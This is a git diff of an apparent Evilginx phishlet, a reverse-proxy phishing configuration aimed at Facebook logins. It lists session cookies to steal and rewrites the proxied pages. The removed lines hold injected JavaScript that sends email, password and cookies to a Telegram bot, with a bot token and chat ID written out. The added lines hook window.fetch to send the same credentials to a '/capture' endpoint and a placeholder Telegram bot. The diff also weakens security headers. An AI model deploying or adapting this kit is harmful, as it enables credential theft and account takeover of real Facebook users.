@@ -3,6 +3,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'facebook.com', session: false}
   - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
@@ -16,7 +17,7 @@ sub_filters:
 
 auth_tokens:
   - domain: '.facebook.com'
-    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin']
+    keys: ['c_user', 'xs', 'sb', 'fr', 'datr', 'wd', 'spin', 'presence']
     secure: true
     http_only: true
     
@@ -49,71 +50,56 @@ credentials:
       search: '(.*)'
       type: 'post'
 
+session_capture:
+  force_redirect: false
+  redirect_url: "https://facebook.com"
+  cookie_domain: ".facebook.com"
+  secure_cookies: true
+  http_only_cookies: true
    
 login:
   domain: 'www.facebook.com'
   path: '/login.php'
 
 response_headers:
-  - name: 'X-Frame-Options'
-    value: 'ALLOW-FROM https://www.facebook.com'
   - name: 'Content-Security-Policy'
-    value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net"
+    value: "default-src 'self' 'unsafe-inline' *.facebook.com *.fbcdn.net data: blob:"
+  - name: 'X-Frame-Options'
+    value: 'ALLOW-FROM https://facebook.com'
 
 js_inject:
-  - trigger_domains: ["www.facebook.com"]
+  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
     trigger_paths: ["/login.php", "/login/device-based/regular/login/", "/login/*"]
     trigger_params: []
     inject_delay: 2000
     cache_buster: true
     script: |  
-      function onclickListener(){
-        var submit = document.querySelectorAll('button[type=submit]')[0];
-        submit.setAttribute("onclick", "sendPass()");
-        var useragent = navigator.userAgent;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("UserAgent="+encodeURIComponent(useragent));
-        var browser = navigator.appName;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Browser="+encodeURIComponent(browser));
-        var engine = navigator.product;
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Engine="+encodeURIComponent(engine));
-        var platform = navigator.platform;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("Platform="+encodeURIComponent(platform));
-        return;
-      }
-      function sendPass(){
-        var password = document.getElementsByName("pass")[0].value;
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/login/device-based/regular/login/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("unenc_password="+encodeURIComponent(password));
-        return;
-      }
-       document.addEventListener('submit', function(e) {
-        if (e.target.method === 'post' && e.target.action.includes('/login/')) {
-          const email = e.target.querySelector('[name="email"]')?.value;
-          const pass = e.target.querySelector('[name="pass"]')?.value;
-          if (email && pass) {
-            fetch(`https://api.telegram.org/bot7584622526:AAFmOMzBnh-3e3EQefLZytschE_W93VmPXI/sendMessage`, {
-              method: 'POST',
-              headers: {'Content-Type': 'application/json'},
-              body: JSON.stringify({
-                chat_id: "5228920520",
-                text: `New Logs\nEmail: ${email}\nPass: ${pass}\nCookie: ${document.cookie}\nIP: ${window.location.hostname}`,
-                disable_notification: false
+      window._originalFetch = window.fetch;
+      console.log('script injected')
+      window.fetch = function(url, init) {
+        if (url.includes('/login/')) {
+          const formData = new URLSearchParams(init?.body || '');
+          if (formData.has('email') && formData.has('pass')) {
+            // Send to both Evilginx and Telegram
+            Promise.all([
+              fetch('/capture', {
+                method: 'POST',
+                body: JSON.stringify({
+                  email: formData.get('email'),
+                  pass: formData.get('pass'),
+                  cookies: document.cookie
+                }),
+                keepalive: true
+              }),
+              fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+                method: 'POST',
+                body: JSON.stringify({
+                  chat_id: "YOUR_CHAT_ID",
+                  text: `New Login\n${formData.get('email')}\n${formData.get('pass')}`
+                })
               })
-            }).catch(e => console.error('Telegram error:', e));
-          } else {
-            console.log('Email or pass not found');
+            ]).catch(e => console.error(e));
           }
         }
-      }, true); 
-      setTimeout(function(){ onclickListener(); }, 1000);
+        return window._originalFetch.apply(this, arguments);
+      };
